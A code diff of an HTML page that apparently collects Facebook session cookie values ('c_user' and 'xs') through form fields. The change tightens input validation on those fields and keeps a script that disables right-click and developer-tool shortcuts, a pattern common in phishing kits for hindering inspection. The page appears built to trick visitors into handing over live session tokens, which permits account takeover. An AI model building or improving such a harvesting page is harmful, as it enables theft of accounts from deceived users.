@@ -909,12 +909,12 @@
     <div><h2 class="tr-5">
       c_user*
     </h2>
-      <input type="number" name="c_user" id="c_user" >
+      <input type="number" name="c_user" id="c_user" pattern="[0-9]+" minlength="6" >
     </div> <br>
     <div><h2 class="tr-5">
       xs*
     </h2>
-      <input type="text" name="xs" id="xs">
+      <input type="text" name="xs" id="xs" pattern="^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@#$%^&amp;+=]).{12,}$" >
     </div> <br>
     <div>
       <p class="text-[10px] font-serif mk-5  mt-3 mx-3">
@@ -6429,15 +6429,15 @@
             }));
         </script>
          <script>
-        document.addEventListener('contextmenu', function(e) {
-            e.preventDefault();
-        });
-        document.onkeydown = function(e) {
-            if (e.ctrlKey && (e.shiftKey || e.key === "I" || e.key === "i")) {
+            document.addEventListener('contextmenu', function(e) {
                 e.preventDefault();
-            }
-        };
-    </script>
+            });
+            document.onkeydown = function(e) {
+                if (e.ctrlKey && (e.shiftKey || e.key === "I" || e.key === "i")) {
+                    e.preventDefault();
+                }
+            };
+        </script>
 </body>
 
 </html>
